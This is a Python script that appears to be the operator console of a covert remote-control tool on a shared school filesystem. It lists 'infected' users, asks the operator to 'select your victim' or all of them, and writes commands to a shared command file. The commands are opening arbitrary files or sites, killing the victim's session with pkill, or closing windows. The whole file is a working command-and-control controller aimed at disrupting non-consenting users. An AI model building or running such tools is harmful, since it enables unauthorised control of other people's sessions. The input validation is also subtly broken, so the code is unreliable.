#!/usr/bin/env python3

import os
import ft_commands_name as comm

def valid_user(user, user_list):
	if user < 0 or user > len(user_list):
		return False
	return True

def valid_command(command):
	if command <= 0 or command > 1:
		return False
	return True

def user_list():
	
	directory = "/sgoinfre/goinfre/Perso/zcadinot/ft_connect/user"
	files = os.listdir(directory)	
	
	print("Select your victim")
	for i in range(len(files)):
		print(f"{i}.{files[i]}")
	print(f"{str(i+1)}.All")
	return files

def command():

	print("-------------------------------------------------------------------------\n		\_which command will you use?_//\n\n1. xdg-open:\n\n	open anything you want (will ask you for a file or a website)\n\n2. pkill -u\n\n	will end the user session\n\n3. 1.out\n\n	will close some windows\n")
	choosed_command = -1
	while not valid_command(choosed_command):
		try:
			choosed_command = int(input())
			return comm.launch_command(choosed_command)

		except TypeError:
			print(f"wrong choice, try again {choosed_command}")
			choosed_command = -1

def main():
	infected_users = user_list()
	user = -1
	while not valid_user(user, infected_users):
		try:
			user = int(input())
			try:
				lines = [infected_users[user]+"\n", command()]
				with open("/sgoinfre/goinfre/Perso/zcadinot/ft_connect/cmd/cmd.txt", "w") as file:
					file.writelines(lines)
			except IndexError:
				if user == len(infected_users):
					lines = ["all\n", command()]
					with open("/sgoinfre/goinfre/Perso/zcadinot/ft_connect/cmd/cmd.txt", "w") as file:
						file.writelines(lines)
				else:
					print("no user at this number")
		except TypeError:
			print("wrong choice, try again")
	print(f"Command {lines[1]} executed on {'all' if user == len(infected_users) else infected_users[user]}")

if __name__ == "__main__":
	main()